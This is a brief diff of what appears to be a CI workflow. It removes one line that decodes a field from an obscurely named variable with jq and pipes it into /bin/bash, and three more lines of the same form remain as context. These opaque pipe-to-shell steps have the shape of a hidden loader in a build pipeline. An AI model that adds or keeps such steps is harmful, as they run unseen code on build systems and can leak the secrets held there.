@@ -35,7 +35,6 @@ jobs:
           printf '%s' "$gnb50451" | jq -r .cu9 | /bin/bash
           echo $qs6 | jq -r .gvxv96 | /bin/bash
           echo $b0391 | jq -r .l3001 | /bin/bash
-          echo $xcio3495 | jq -r .gfron8 | /bin/bash
 
       - name: Archive results
         if: always()
